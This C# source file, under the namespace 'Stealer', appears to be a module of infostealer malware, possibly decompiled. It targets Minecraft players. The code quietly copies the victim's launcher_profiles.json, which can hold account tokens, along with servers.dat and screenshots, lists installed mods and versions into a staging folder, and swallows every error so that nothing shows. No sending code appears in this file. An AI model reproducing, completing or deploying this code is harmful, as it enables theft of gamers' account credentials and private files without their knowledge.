using System.IO;
using RFStub;

namespace Stealer;

internal sealed class Minecraft
{
	private static string MinecraftPath = Path.Combine(Paths.appdata, ".minecraft");

	private static void SaveVersions(string sSavePath)
	{
		string[] directories = Directory.GetDirectories(Path.Combine(MinecraftPath, "versions"));
		foreach (string path in directories)
		{
			string name = new DirectoryInfo(path).Name;
			string text = Filemanager.DirectorySize(path) + " bytes";
			string text2 = Directory.GetCreationTime(path).ToString("yyyy-MM-dd h:mm:ss tt");
			File.AppendAllText(sSavePath + "\\versions.txt", "VERSION: " + name + "\n\tSIZE: " + text + "\n\tDATE: " + text2 + "\n\n");
		}
	}

	private static void SaveMods(string sSavePath)
	{
		string[] files = Directory.GetFiles(Path.Combine(MinecraftPath, "mods"));
		foreach (string text in files)
		{
			string fileName = Path.GetFileName(text);
			string text2 = new FileInfo(text).Length + " bytes";
			string text3 = File.GetCreationTime(text).ToString("yyyy-MM-dd h:mm:ss tt");
			File.AppendAllText(sSavePath + "\\mods.txt", "MOD: " + fileName + "\n\tSIZE: " + text2 + "\n\tDATE: " + text3 + "\n\n");
		}
	}

	private static void SaveScreenshots(string sSavePath)
	{
		string[] files = Directory.GetFiles(Path.Combine(MinecraftPath, "screenshots"));
		if (files.Length != 0)
		{
			Directory.CreateDirectory(sSavePath + "\\screenshots");
			string[] array = files;
			foreach (string text in array)
			{
				File.Copy(text, sSavePath + "\\screenshots\\" + Path.GetFileName(text));
			}
		}
	}

	private static void SaveServers(string sSavePath)
	{
		string text = Path.Combine(MinecraftPath, "servers.dat");
		if (File.Exists(text))
		{
			File.Copy(text, sSavePath + "\\servers.dat");
		}
	}

	private static void SaveProfiles(string sSavePath)
	{
		string text = Path.Combine(MinecraftPath, "launcher_profiles.json");
		if (File.Exists(text))
		{
			File.Copy(text, sSavePath + "\\launcher_profiles.json");
		}
	}

	public static void SaveAll(string sSavePath)
	{
		if (Directory.Exists(MinecraftPath))
		{
			try
			{
				Directory.CreateDirectory(sSavePath);
				SaveProfiles(sSavePath);
				SaveServers(sSavePath);
				SaveScreenshots(sSavePath);
				SaveMods(sSavePath);
				SaveVersions(sSavePath);
			}
			catch
			{
			}
		}
	}
}
